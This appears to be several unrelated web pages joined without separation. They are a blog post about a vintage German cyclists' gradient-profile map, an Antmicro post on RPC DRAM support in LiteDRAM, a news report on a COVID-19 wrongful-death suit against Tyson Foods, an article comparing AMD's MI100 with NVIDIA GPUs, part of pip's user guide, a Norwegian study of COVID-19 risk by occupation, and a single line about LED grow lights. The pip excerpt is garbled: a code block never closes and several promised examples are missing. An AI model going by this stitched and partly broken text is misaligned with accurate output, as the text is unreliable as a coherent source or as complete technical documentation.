				<p>We cycled the Swiss part of the Rhine Cycleway last week, with our <a href="https://www.bikefriday.com/bicycles/touring/1248">folding</a> <a href="http://airnimal.eu/products/chameleon/performance-sport/">bikes</a> neatly stowed in suitcases for the flight. A combination of <em><a href="http://cycle.travel/">cycle.travel</a></em> (natch), the Cicerone guide, and the excellent <a href="https://itunes.apple.com/gb/app/mapout/id477094081?l=en&amp;mt=8">MapOut</a> app guided us safely along the way: a very modern combination of mapping styles.</p><p>Wandering around Zürich, waiting for our flight home, I was intrigued by this cycle map in the window of a (closed) antiquarian bookstore:</p><p><img src="http://blog.systemed.net/images/original/strassenprofilkarte_1.jpg"></p><p>And if that isn’t clear enough from the pic snatched through a window, here’s a better excerpt from <a href="http://www.ak-ansichtskarten.de/shop/ak/46/back4684588/Rueckseite-Deutsche-Strassenprofilkarte-fuer-Radfahrer-Strassburg-und-Umgebung-Naumann-s-Fahrraeder-Seidel-Naumann-Dresden.jpg">an example</a> I found online:</p><p><img src="http://blog.systemed.net/images/original/strassenprofilkarte_2.jpg"></p><p>On major climbs, rather than strictly following the two-dimensional curves of the route as a conventional map would do, the map shows a miniature gradient profile for that particular hill.</p><p>Bending geometry to show a subjective view of space is nothing unusual. The Tube map (and its many imitators) famously do it, as do the one-dimensional strip maps that Laurence Penney has <a href="http://www.youshouldliketypetoo.com/blog/misc/one-dimensional-maps/">lovingly curated</a>&nbsp;(and, indeed, one of Laurence’s maps has a <a href="http://www.youshouldliketypetoo.com/wp-content/uploads/2012/12/one-dimensional-maps-14.jpg">passing resemblance</a> to these German sheets). But I’ve never seen quite this approach taken before. It’s a recognition that – just as distance is immaterial to the Tube passenger – to the cyclist, hills are as much part of the ‘distance travelled’ as are the ticking miles on the cycle computer.</p><p>Not that the Radfahrer in question would have had cycle computers, of course. There appear to have been 80 of these sheets, published by&nbsp;Mittelbach's Verlag of Leipzig with the co-operation and support of the national German cycling organisations <em>(unter Mitwirkung der Gauverbände des Deutschen Radfahrerbundes und der Konsulate der Allgemeinen Radfahrer-Union)</em>. They seem to date from the beginning of the 20th century, and are not yet collectable, if the <a href="http://www.abebooks.co.uk/Deutsche-Strassenprofilkarte-Radfahrer-Mitwirkung-Gauverb%C3%A4nde-Deutschen/6461038791/bd">prices on Abebooks</a> are anything to go by.</p><p>And in one of those curious coincidences…</p><p>I originally finished this post with “<span>I don’t expect to see a revival any day soon”, but the day after I posted this, Sustrans Midlands retweeted a link to <a href="https://twitter.com/Lunto_Sustrans/status/496934542880833536">exactly such a map</a>.

        <p>The Internet of Things is one of the areas that is hugely benefiting from miniaturization of semiconductor technologies, as more computing power can be encapsulated into increasingly smaller devices. Shrinking in size and requiring less power, various devices - including AI-capable ones - are applied in ways that were not possible a few years ago. One of the new and exciting developments in this space is the emergence of <a href="https://etronamerica.com/products/rpc-dram/">RPC (reduced pin-count) DRAM</a> - a small form factor memory, for which Antmicro has developed support in the open source memory controller, LiteDRAM. Our contribution, already made available on <a href="https://github.com/antmicro/litedram/tree/rpc-dram-support">GitHub</a> is being polished and undergoing final tests, and will be mainlined shortly.</p>

<h3 id="what-is-rpc-dram">What is RPC DRAM</h3>

<p>Standard modern DRAM chips, with their small but not miniscule footprints and rather high I/O requirements, are impossible to use in space-constrained applications. By using a large number of pins in the device they connect to, they can also push the envelope of the device itself even more, requiring larger and more expensive packages of the FPGA or SoC used. <br>
And while many edge devices could easily do with a smaller amount (e.g. sub-1Gb) of RAM than what modern memory parts offer, it is impossible to cut a RAM chip in half and get less memory capacity. Well, at least until now - kind of.</p>

<p>The so-called RPC (Reduced Pin Count) DRAM - a new technology from Etron - has the potential to profoundly impact the AI, IoT and VR/AR markets. It is a tiny memory chip family which can get as small as 1.96mm x 4.63mm, offering 256Mbits and high bandwidth (the same as DDR3) using only 10% of the DDR3 PCB area and only half of the SoC or FPGA pins that the DDR3 memory takes up. Its clock speed can go up to 1200MHz, with bandwidth of up to 4800 Mb/s.</p>

<p><img src="https://antmicro.com/blog/images/LiteDRAM_with_RPC_RAM_blog-note.png" alt="DDR RAM and RPC DRAM comparison"></p>

<p>RPC DRAM is ideal for space-constrained edge AI applications that locally process data such as video, audio or image, where, apart from space saving, low power consumption is critical. The small number of pins used by RPC DRAM leaves more available resources for other system functionalities, while the possibility of stacking multiple RPC DRAM chips on top of one another for further layout optimization makes the technology even more appealing. It also enables interesting scenarios like <a href="https://antmicro.com/blog/2020/10/open-chiplet-initiative/#future-developments">embedding in a chiplet-based SiP</a>, or even bare-die integration with small FPGAs for a powerful, Linux-capable device. But to use the memory with FPGAs, you need to interface with it using a DRAM controller - and that is where our latest work with LiteDRAM comes in.</p>

<h3 id="litedram-and-open-source-ip-ecosystem">LiteDRAM and open source IP ecosystem</h3>

<p>LiteDRAM is a configurable memory controller that is part of LiteX, an open source SoC builder that we are developing and using to design FPGA-based systems. By creating support for RPC DRAM in LiteDRAM we have enabled the miniscule memory to be added to products that we build and to the whole LiteX ecosystem. This enables our customer’s devices to run more compute-hungry applications or full-fledged operating systems such as Linux in dedicated SoCs created by Antmicro on demand.</p>

<p>We use and contribute to LiteDRAM, LiteX and other open source IP to develop unique designs interfaced with DDR memories for high-bandwidth video and other data processing systems; and RPC DRAM support is just one example of the enablement work we are performing in the ecosystem. Combined with the exciting work related to open source we are performing as part of <a href="https://antmicro.com/blog/2020/07/swerv-cores-tools-ecosystem/">CHIPS Alliance</a>, <a href="https://antmicro.com/blog/2020/06/skywater-open-source-pdk/">SkyWater PDK</a> and the fantastic enregy catalyzed by the open <a href="https://antmicro.com/technologies/risc-v/">RISC-V</a> CPU architecture (which is an obvious candidate for combining with RPC RAM both in soft- and hard CPU contexts), future is looking bright for tiny, open, ML-capable systems.</p>

        <p>A wrongful death lawsuit tied to COVID-19 infections in a Waterloo pork processing plant alleges that during the initial stages of the pandemic, Tyson Foods ordered employees to report for work while supervisors privately wagered money on the number of workers who would be sickened by the deadly virus.</p>
<p>Earlier this year, the family of the late Isidro Fernandez sued the meatpacking company, alleging Fernandez was exposed to the coronavirus at the Waterloo plant where he worked. The lawsuit alleges Tyson Foods is guilty of a “willful and wanton disregard for workplace safety.”</p>
<p>In a written statement issued Thursday afternoon, Tyson Foods’ president and chief executive officer, Dean Banks, said: “We are extremely upset about the accusations involving some of the leadership at our Waterloo plant. Tyson Foods is a family company with 139,000 team members and these allegations do not represent who we are, or our core values and team behaviors. We expect every team member at Tyson Foods to operate with the utmost integrity and care in everything we do.</p>
<p>“We have suspended, without pay, the individuals allegedly involved and have retained the law firm Covington &amp; Burling LLP to conduct an independent investigation led by former Attorney General Eric Holder. If these claims are confirmed, we’ll take all measures necessary to root out and remove this disturbing behavior from our company.</p>
<p>“Our top priority is and remains the health and safety of our team members.”</p>
<p>Fernandez, who died on April 20, was one of at least five Waterloo plant employees who died of the virus. According to the Black Hawk County Health Department, more than 1,000 workers at the plant — over a third of the facility’s workforce — contracted the virus.</p>
<p>The lawsuit alleges that despite the uncontrolled spread of the virus at the plant, Tyson required its employees to work long hours in cramped conditions without providing the appropriate personal protective equipment and without ensuring workplace-safety measures were followed.</p>
<p>The lawsuit was recently amended and includes a number of new allegations against the company and plant officials. Among them:</p>
<ul>
<li>In mid-April, around the time Black Hawk County Sherriff Tony Thompson visited the plant and reported the working conditions there “shook [him] to the core,” plant manager Tom Hart organized a cash-buy-in, winner-take-all, betting pool for supervisors and managers to wager how many plant employees would test positive for COVID-19.</li>
<li>John Casey, an upper-level manager at the plant, is alleged to have explicitly directed supervisors to ignore symptoms of COVID-19, telling them to show up to work even if they were exhibiting symptoms of the virus. Casey reportedly referred to COVID-19 as the “glorified flu” and told workers not to worry about it because “it’s not a big deal” and “everyone is going to get it.” On one occasion, Casey intercepted a sick supervisor who was on his way to be tested and ordered him to get back to work, saying, “We all have symptoms — you have a job to do.” After one employee vomited on the production line, managers reportedly allowed the man to continue working and then return to work the next day.</li>
<li>In late March or early April, as the pandemic spread across Iowa, managers at the Waterloo plant reportedly began avoiding the plant floor for fear of contracting the virus. As a result, they increasingly delegated managerial authority and responsibilities to low-level supervisors who had no management training or experience. The supervisors did not require truck drivers and subcontractors to have their temperatures checked before entering the plant.</li>
<li>In March and April, plant supervisors falsely denied the existence of any confirmed cases or positive tests for COVID-19 within the plant, and allegedly told workers they had a responsibility to keep working to ensure Americans didn’t go hungry as the result of a shutdown.</li>
<li>Tyson paid out $500 “thank you bonuses” to employees who turned up for every scheduled shift for three months — a policy decision that allegedly incentivized sick workers to continue reporting for work.</li>
<li>Tyson executives allegedly lobbied Iowa Gov. Kim Reynolds for COVID-19 liability protections that would shield the company from lawsuits, and successfully lobbied the governor to declare that only the state government, not local governments, had the authority to close businesses in response to the pandemic.</li>
</ul>
<p>While Tyson has yet to file a formal response to the new allegations, it has said in previous court filings that it “vigorously disputes” the plaintiffs’ claims and has “invested millions of dollars to provide employees with safety and risk-mitigation equipment.”</p>
<p>The lawsuit claims that while Tyson has repeatedly claimed that its operations needed to remain open to feed America, the company increased its exports to China by 600% during the first quarter of 2020.</p>
<p>The lawsuit is seeking unspecified damages for fraudulent misrepresentation and gross negligence.</p>
<p>The case was initially filed in state court, claiming violations of Iowa law. At Tyson’s request, the case was moved to federal court, with the company claiming it had remained open during the pandemic “at the direction of a federal officer” — President Donald Trump, who, on April 28, invoked his authority under the <a href="https://iowacapitaldispatch.com/2020/05/04/trumps-critics-warn-his-order-to-keep-meat-plants-open-imperils-workers/">Defense Production Act</a> and ordered meat and poultry processing companies to continue operating.</p>
<p>The nonprofit organization Public Citizen has filed an amicus brief in the case, supporting the Fernandez family’s efforts to remand the action back to state court. In its brief, Public Citizen has said that neither the Defense Production Act nor the executive order signed by President Trump had “directed” Tyson to do anything.</p>
<p>The Waterloo facility is Tyson’s largest pork plant in the United States. The facility employs approximately 2,800 workers who process approximately 19,500 hogs per day.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-content-area">
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/48301387cddb344c254ee94cde7f04d7/p/uploads/2020/11/db6591d4-1.png" alt="" width="700" height="313"></p>
<p>With the rising demand for HPC and AI-powered cloud applications comes a need for very powerful datacenter GPUs. Usually NVIDIA is the king of this field, but AMD’s latest MI100 GPU presents some serious competition.</p>
<h2 role="heading" aria-level="2">A Card For The HPC Market</h2>
<p>The card is fast, seriously fast. NVIDIA’s high end A100 GPU peaks at&nbsp;9.7 TFLOPS in FP64 workloads. The new “AMD Instinct MI100” leaps past that at 11.5 TFLOPS.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/2f6292f97a12046b544017f07246a4f8/p/uploads/2020/11/8d6e8097.png" alt="" width="700" height="312"></p>
<p>Of course, NVIDIA’s cards support other speedup techniques for AI-specific workloads in different number formats, such as the TensorFloat-32 precision format and<a href="https://www.cloudsavvyit.com/4796/nvidias-new-ampere-gpu-is-a-game-changer-for-artificial-intelligence/"> fine-grained structured sparsity</a>. For AI and Machine Learning workloads, NVIDIA is still king, as their cards are built specifically for tensor-based operations.</p>
<p>But, for general purpose High Performance Computing, the MI100 takes the crown for raw compute power. Plus, it’s nearly half the price, and is much more efficient per watt.</p>
<p>On top of the other improvements, the new architecture also brings mixed-precision improvements, with their “Matrix Core” technology delivering 7x greater FP16 performance compared to their prior generation of cards.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/6588bb99d6c97c60163b08630e9b8d86/p/uploads/2020/11/292c692b.png" alt="" width="700" height="216"></p>
<p>AMD CPUs and Instinct GPUS are <a href="https://www.olcf.ornl.gov/frontier/">both powering two of the US Department of Energy’s exascale supercomputers</a>. The “Frontier” supercomputer is planned to be built next year with current Epyc CPUs and MI100s, and will deliver more than 1.5 exaflops of peak computing power. The “El Capitan” supercomputer is planned to be built in 2023 on next gen hardware, and will deliver more than 2 exaflops of double precision power.</p>
<h2 role="heading" aria-level="2">Can ROCm Live Up to CUDA?</h2>
<p>Of course, all of this power is useless if the software doesn’t support it. It’s no secret that NVIDIA has managed to make machine learning a bit of a walled garden.</p>
<p>NVIDIA’s compute framework is called <a href="https://en.wikipedia.org/wiki/CUDA">CUDA</a>, or&nbsp;Compute Unified Device Architecture. It’s proprietary, and only works with their cards. But since their cards have historically been the fastest, many applications are only built with CUDA support first and foremost.</p>
<p>There are cross-platform programming models, most notably OpenCL, which AMD supports very well <a href="https://rocmdocs.amd.com/en/latest/">with their ROCm platform</a>. Both NVIDIA cards and AMD cards support OpenCL, but because NVIDIA only supports it by transpiling to CUDA, it’s actually slower to use OpenCL with an NVIDIA card. Because of this, not all applications will support it.</p>
<p>Ultimately, you’ll need to do your own research and see if the application you intend to run can be run on AMD cards, and maybe be prepared for some tinkering and bug fixing. NVIDIA GPUs on the otherhand are mostly plug and play, so even if AMD is faster, NVIDIA can continue to hinder them with closed-source software.</p>
<p>However, this situation is getting better—AMD is committed to open sourcing everything and creating an open environment. Tensorflow and PyTorch, two very popular ML frameworks, both support the ROCm ecosystem.</p>
<p><img src="https://www.cloudsavvyit.com/thumbcache/0/0/03aae3c52689bd7fd58e8278df8fefac/p/uploads/2020/11/301c98b9.png" alt="" width="697" height="479"></p>
<p>Hopefully the raw specs of AMD’s latest offerings can push the industry to a more competitive environment. After all, they’re being put to use in supercomputers</p>

<div id="running-pip">
<h2>Running pip<a href="#running-pip" title="Permalink to this headline">¶</a></h2>
<p>pip is a command line program. When you install pip, a <code><span>pip</span></code> command is added
to your system, which can be run from the command prompt as follows:</p>
<div>
<p><label for="tab-set--0-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip &lt;pip arguments&gt;
</pre></div>
</div>
<p><code><span>python</span> <span>-m</span> <span>pip</span></code> executes pip using the Python interpreter you
specified as python. So <code><span>/usr/bin/python3.7</span> <span>-m</span> <span>pip</span></code> means
you are executing pip for your interpreter located at /usr/bin/python3.7.</p>
</div>
<p><label for="tab-set--0-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip &lt;pip arguments&gt;
</pre></div>
</div>
<p><code><span>py</span> <span>-m</span> <span>pip</span></code> executes pip using the latest Python interpreter you
have installed. For more details, read the <a href="https://docs.python.org/3/using/windows.html#launcher">Python Windows launcher</a> docs.</p>
</div>
</div>
</div>
<div id="installing-packages">
<h2>Installing Packages<a href="#installing-packages" title="Permalink to this headline">¶</a></h2>
<p>pip supports installing from <a href="https://pypi.org/">PyPI</a>, version control, local projects, and
directly from distribution files.</p>
<p>The most common scenario is to install from <a href="https://pypi.org/">PyPI</a> using <a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirement-specifiers"><span>Requirement Specifiers</span></a></p>
<div>

</div>
<div id="basic-authentication-credentials">
<h2>Basic Authentication Credentials<a href="#basic-authentication-credentials" title="Permalink to this headline">¶</a></h2>
<p>pip supports basic authentication credentials. Basically, in the URL there is
a username and password separated by <code><span>:</span></code>.</p>
<p><code><span>https://[username[:password]@]pypi.company.com/simple</span></code></p>
<p>Certain special characters are not valid in the authentication part of URLs.
If the user or password part of your login credentials contain any of the
special characters
<a href="https://en.wikipedia.org/wiki/Percent-encoding#Percent-encoding_reserved_characters">here</a>
then they must be percent-encoded. For example, for a
user with username “user” and password “he//o” accessing a repository at
pypi.company.com, the index URL with credentials would look like:</p>
<p><code><span>https://user:he%2F%2Fo@pypi.company.com</span></code></p>
<p>Support for percent-encoded authentication in index URLs was added in pip 10.0.0
(in <a href="https://github.com/pypa/pip/issues/3236">#3236</a>). Users that must use authentication
for their Python repository on systems with older pip versions should make the latest
get-pip.py available in their environment to bootstrap pip to a recent-enough version.</p>
<p>For indexes that only require single-part authentication tokens, provide the token
as the “username” and do not provide a password, for example -</p>
<p><code><span>https://0123456789abcdef@pypi.company.com</span></code></p>
<div id="netrc-support">
<h3>netrc Support<a href="#netrc-support" title="Permalink to this headline">¶</a></h3>
<p>If no credentials are part of the URL, pip will attempt to get authentication credentials
for the URL’s hostname from the user’s .netrc file. This behaviour comes from the underlying
use of <a href="https://requests.readthedocs.io/en/master/user/authentication/#netrc-authentication">requests</a> which in turn delegates it to the <a href="https://docs.python.org/3/library/netrc.html">Python standard library</a>.</p>
<p>The .netrc file contains login and initialization information used by the auto-login process.
It resides in the user’s home directory. The .netrc file format is simple. You specify lines
with a machine name and follow that with lines for the login and password that are
associated with that machine. Machine name is the hostname in your URL.</p>
<p>An example .netrc for the host example.com with a user named ‘daniel’, using the password
‘qwerty’ would look like:</p>
<div><div><pre><span></span>machine example.com
login daniel
password qwerty
</pre></div>
</div>
<p>As mentioned in the <a href="https://docs.python.org/3/library/netrc.html">standard library docs</a>,
only ASCII characters are allowed. Whitespace and non-printable characters are not allowed in passwords.</p>
</div>
<div id="keyring-support">
<h3>Keyring Support<a href="#keyring-support" title="Permalink to this headline">¶</a></h3>
<p>pip also supports credentials stored in your keyring using the <a href="https://pypi.org/project/keyring/">keyring</a>
library. Note that <code><span>keyring</span></code> will need to be installed separately, as pip
does not come with it included.</p>
<div><div><pre><span></span>pip install keyring
<span>echo</span> your-password <span>|</span> keyring <span>set</span> pypi.company.com your-username
pip install your-package --extra-index-url https://pypi.company.com/

<div id="using-a-proxy-server">
<h2>Using a Proxy Server<a href="#using-a-proxy-server" title="Permalink to this headline">¶</a></h2>
<p>When installing packages from <a href="https://pypi.org/">PyPI</a>, pip requires internet access, which
in many corporate environments requires an outbound HTTP proxy server.</p>
<p>pip can be configured to connect through a proxy server in various ways:</p>
<ul>
<li><p>using the <code><span>--proxy</span></code> command-line option to specify a proxy in the form
<code><span>[user:passwd@]proxy.server:port</span></code></p></li>
<li><p>using <code><span>proxy</span></code> in a <a href="#config-file"><span>Config file</span></a></p></li>
<li><p>by setting the standard environment-variables <code><span>http_proxy</span></code>, <code><span>https_proxy</span></code>
and <code><span>no_proxy</span></code>.</p></li>
<li><p>using the environment variable <code><span>PIP_USER_AGENT_USER_DATA</span></code> to include
a JSON-encoded string in the user-agent variable used in pip’s requests.</p></li>
</ul>
</div>
<div id="requirements-files">
<h2>Requirements Files<a href="#requirements-files" title="Permalink to this headline">¶</a></h2>
<p>“Requirements files” are files containing a list of items to be
installed using <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> like so:</p>
<div>
<p><label for="tab-set--2-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--2-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install -r requirements.txt
</pre></div>
</div>
</div>
</div>
<p>Details on the format of the files are here: <a href="https://pip.pypa.io/en/latest/reference/pip_install/#requirements-file-format"><span>Requirements File Format</span></a>.</p>
<p>Logically, a Requirements file is just a list of <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a> arguments
placed in a file. Note that you should not rely on the items in the file being
installed by pip in any particular order.</p>
<p>In practice, there are 4 common uses of Requirements files:</p>
<ol>
<li><p>Requirements files are used to hold the result from <a href="https://pip.pypa.io/en/latest/reference/pip_freeze/#pip-freeze"><span>pip freeze</span></a> for the
purpose of achieving <a href="#repeatability"><span>repeatable installations</span></a>.  In
this case, your requirement file contains a pinned version of everything that
was installed when <code><span>pip</span> <span>freeze</span></code> was run.</p>
<div>
<p><label for="tab-set--3-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip freeze &gt; requirements.txt
python -m pip install -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--3-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip freeze &gt; requirements.txt
py -m pip install -r requirements.txt
</pre></div>
</div>
</div>
</div>
</li>
<li><p>Requirements files are used to force pip to properly resolve dependencies.
pip 20.2 and earlier <a href="https://github.com/pypa/pip/issues/988">doesn’t have true dependency resolution</a>, but instead simply uses the first
specification it finds for a project. E.g. if <code><span>pkg1</span></code> requires
<code><span>pkg3&gt;=1.0</span></code> and <code><span>pkg2</span></code> requires <code><span>pkg3&gt;=1.0,&lt;=2.0</span></code>, and if <code><span>pkg1</span></code> is
resolved first, pip will only use <code><span>pkg3&gt;=1.0</span></code>, and could easily end up
installing a version of <code><span>pkg3</span></code> that conflicts with the needs of <code><span>pkg2</span></code>.
To solve this problem, you can place <code><span>pkg3&gt;=1.0,&lt;=2.0</span></code> (i.e. the correct
specification) into your requirements file directly along with the other top
level requirements. Like so:</p>

<li><p>Requirements files are used to force pip to install an alternate version of a
sub-dependency.  For example, suppose <code><span>ProjectA</span></code> in your requirements file
requires <code><span>ProjectB</span></code>, but the latest version (v1.3) has a bug, you can force
pip to accept earlier versions like so:</p>

</li>
<li><p>Requirements files are used to override a dependency with a local patch that
lives in version control.  For example, suppose a dependency
<code><span>SomeDependency</span></code> from PyPI has a bug, and you can’t wait for an upstream
fix.
You could clone/copy the src, make the fix, and place it in VCS with the tag
<code><span>sometag</span></code>.  You’d reference it in your requirements file with a line like
so:</p>
<div><div><pre><span></span><span>git</span><span>+</span><span>https</span><span>:</span><span>//</span><span>myvcs</span><span>.</span><span>com</span><span>/</span><span>some_dependency</span><span>@sometag</span><span>#egg=SomeDependency</span>
</pre></div>
</div>
<p>If <code><span>SomeDependency</span></code> was previously a top-level requirement in your
requirements file, then <strong>replace</strong> that line with the new line. If
<code><span>SomeDependency</span></code> is a sub-dependency, then <strong>add</strong> the new line.</p>
</li>
</ol>
<p>It’s important to be clear that pip determines package dependencies using
<a href="https://setuptools.readthedocs.io/en/latest/setuptools.html#declaring-dependencies">install_requires metadata</a>,
not by discovering <code><span>requirements.txt</span></code> files embedded in projects.</p>

<div id="constraints-files">
<h2>Constraints Files<a href="#constraints-files" title="Permalink to this headline">¶</a></h2>
<p>Constraints files are requirements files that only control which version of a
requirement is installed, not whether it is installed or not. Their syntax and
contents is nearly identical to <a href="#requirements-files"><span>Requirements Files</span></a>. There is one key
difference: Including a package in a constraints file does not trigger
installation of the package.</p>
<p>Use a constraints file like so:</p>
<div>
<p><label for="tab-set--4-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install -c constraints.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--4-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install -c constraints.txt
</pre></div>
</div>
</div>
</div>
<p>Constraints files are used for exactly the same reason as requirements files
when you don’t know exactly what things you want to install. For instance, say
that the “helloworld” package doesn’t work in your environment, so you have a
local patched version. Some things you install depend on “helloworld”, and some
don’t.</p>
<p>One way to ensure that the patched version is used consistently is to
manually audit the dependencies of everything you install, and if “helloworld”
is present, write a requirements file to use when installing that thing.</p>
<p>Constraints files offer a better way: write a single constraints file for your
organisation and use that everywhere. If the thing being installed requires
“helloworld” to be installed, your fixed version specified in your constraints
file will be used.</p>
<p>Constraints file support was added in pip 7.1. In <a href="#resolver-changes-2020"><span>Changes to the pip dependency resolver in 20.3 (2020)</span></a> we did a fairly comprehensive overhaul, removing several
undocumented and unsupported quirks from the previous implementation,
and stripped constraints files down to being purely a way to specify
global (version) limits for packages.</p>
</div>
<div id="installing-from-wheels">
<h2>Installing from Wheels<a href="#installing-from-wheels" title="Permalink to this headline">¶</a></h2>
<p>“Wheel” is a built, archive format that can greatly speed installation compared
to building and installing from source archives. For more information, see the
<a href="https://wheel.readthedocs.io/">Wheel docs</a> , <span id="index-0"></span><a href="https://www.python.org/dev/peps/pep-0427"><strong>PEP 427</strong></a>, and <span id="index-1"></span><a href="https://www.python.org/dev/peps/pep-0425"><strong>PEP 425</strong></a>.</p>
<p>pip prefers Wheels where they are available. To disable this, use the
<a href="https://pip.pypa.io/en/latest/reference/pip_install/#install-no-binary"><span>--no-binary</span></a> flag for <a href="https://pip.pypa.io/en/latest/reference/pip_install/#pip-install"><span>pip install</span></a>.</p>
<p>If no satisfactory wheels are found, pip will default to finding source
archives.</p>
<p>To install directly from a wheel archive:</p>
<div>
<p><label for="tab-set--5-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install SomePackage-1.0-py2.py3-none-any.whl
</pre></div>
</div>
</div>
<p><label for="tab-set--5-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install SomePackage-1.0-py2.py3-none-any.whl
</pre></div>
</div>
</div>
</div>
<p>For the cases where wheels are not available, pip offers <a href="https://pip.pypa.io/en/latest/reference/pip_wheel/#pip-wheel"><span>pip wheel</span></a> as a
convenience, to build wheels for all your requirements and dependencies.</p>
<p><a href="https://pip.pypa.io/en/latest/reference/pip_wheel/#pip-wheel"><span>pip wheel</span></a> requires the <a href="https://pypi.org/project/wheel/">wheel package</a> to be installed, which provides the
“bdist_wheel” setuptools extension that it uses.</p>
<p>To build wheels for your requirements and all their dependencies to a local
directory:</p>
<div>
<p><label for="tab-set--6-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install wheel
python -m pip wheel --wheel-dir<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
<p><label for="tab-set--6-input--2">Windows</label></p><div>
<div><div><pre><span></span>py -m pip install wheel
py -m pip wheel --wheel-dir<span>=</span>/local/wheels -r requirements.txt
</pre></div>
</div>
</div>
</div>
<p>And <em>then</em> to install those requirements just using your local directory of
wheels (and not from PyPI):</p>
<div>
<p><label for="tab-set--7-input--1">Unix/macOS</label></p><div>
<div><div><pre><span></span>python -m pip install --no-index --find-links<span>=</span>/local/wheels -r requirements.txt
</pre></div>

</div>
<p><label for="tab-set--7-input--2">Windows</label></p><div>

November 18, 2020 | https://www.fhi.no/en/news/2020/more-covid-19-in-some-occupational-groups/ | <a href="https://web.archive.org/web/*/https://www.fhi.no/en/news/2020/more-covid-19-in-some-occupational-groups/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Researchers at the Norwegian Institute of Public Health have investigated whether occupational groups with frequent contact with customers, students, users or patients have an increased risk of COVID-19. Data are retrieved from health registries and other registries.</p>
<p>“We see that healthcare personnel and drivers were most exposed in the first period of the epidemic in the winter and spring of 2020. This autumn, we did not find more cases of COVID-19 among healthcare personnel than among other groups. The risk may have been higher this autumn for employees that meet many customers, such as bartenders and waiters,” says Karin Magnusson, researcher at the Norwegian Institute of Public Health and first author of the study.</p>
<h2>The most important findings</h2>
<h3>Period February-July</h3>
<p>The results are preliminary and show that in the period from February to mid-July 2020 there were:</p>
<ul>
<li>2.3 COVID-19 cases per 1 000 people in their working age (20-70 years) in Norway.</li>
<li>Among health professionals such as physiotherapists, dentists, nurses and doctors, there were 3.5 to 6.5 cases per 1 000, which is 1.5 to 3 times more than in the rest of the population of working age.</li>
<li>Among taxi drivers, bus drivers and tram drivers, there was a similar increase: from 3.4 to 5.5 cases per 1 000.</li>
</ul>
<h3>Period July-October</h3>
<p>In the period from mid-July to mid-October 2020 there were:</p>
<ul>
<li>2.6 COVID-19 cases per 1000 people of working age in Norway, which is higher than in the first period.</li>
<li>Most vulnerable in the second period were employees in the catering industry, such as bartenders and waiters, as well as flight attendants and boat stewards. The number of COVID-19 cases ranged from 6.2 to 8.9 per 1 000.</li>
<li>Among healthcare personnel, the number in the second period was lower or at the same level as among others of working age.</li>
<li>Among bus drivers and tram drivers, there were similar levels as among other people of working age, however there were more cases among taxi drivers (4.2 per 1000).</li>
</ul>
<h3>Results per occupational group</h3>
<p>The results are divided by occupational group. Among teachers, there were no more COVID-19 cases when compared to everyone in their working age, this applies to both periods.</p>


        <figure>

                <a href="https://www.fhi.no/contentassets/33240a54e1df42dda18cdc299408b1c7/occupations-eng.png" data-lightbox="image-gallery">

                </a>


        </figure>



<p>The number of confirmed COVID-19 per 1000 working people in different occupations in Norway, before and after 18 July 2020. Vertical lines show the proportion of confirmed cases for everyone of working age (20-70 years) for the two periods.</p>
<h2>Test criteria can explain differences between periods</h2>
<p>“The difference between the first and second wave may be due to changes in the test criteria. In the first wave, there was a shortage of test equipment, and patients, risk groups and healthcare personnel were prioritised for testing. In the second wave, close contacts and people with mild symptoms could also be tested. Another explanation may be infection control measures, including the fact that fewer people went abroad on holiday,” says Magnusson.</p>
<p>“The high proportion of doctors who were infected in the first period may, for example, have been infected on holiday in Italy, and not in Norway at the doctor's office. However, we do not know this, so one explanation could therefore also be better protection of healthcare personnel. In future studies, we can put several possible explanatory factors together and learn more about the risk of infection in different settings,” she adds.</p>
<h2>Hospital admissions</h2>
<p>There were no differences between occupational groups for severe COVID-19 disease and admissions to hospital. Dentists were the exception, with more hospital admissions than other occupational groups. This raises the question of whether infection with a large dose of virus from individuals increases the risk of more serious disease, but the numbers are low and therefore uncertain.</p>
<h2>About the study</h2>
<p>The purpose was to study whether the risk of COVID-19 and admissions to hospital increased among workers in occupations with a lot of direct contact with other people, compared with others of working age.</p>
<p>The study includes more than 3.5 million inhabitants of working age, between 20 and 70 years. The average age was 44 years, and there was an equal distribution between men and women. Each occupational group was compared with the rest of the working population of working age, and the risk was adjusted for age, gender and country of birth.</p>
<p>Data about COVID-19 were retrieved from the <a href="https://www.fhi.no/sv/smittsomme-sykdommer/corona/norsk-beredskapsregister-for-covid-19/">Beredt-19</a> registry at the Norwegian Institute of Public Health. This registry combines data from, among others, the Norwegian Surveillance System for Communicable Diseases (MSIS), the Norwegian Patient Registry, the National Population Register and NAV's employer and employee register.</p>
<p>As far as the researchers are aware, this is the first national study on occupational activity and COVID-19 risk. The methods used are identical to those described in the reference (Magnusson <em>et al</em>., 2020), with updated data including November 3rd 2020.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <p>Many indoor growers wonder if they can use any old LED light as a grow light. They thought these two types of LED lights had no difference as they can both emit human visible light.</p>
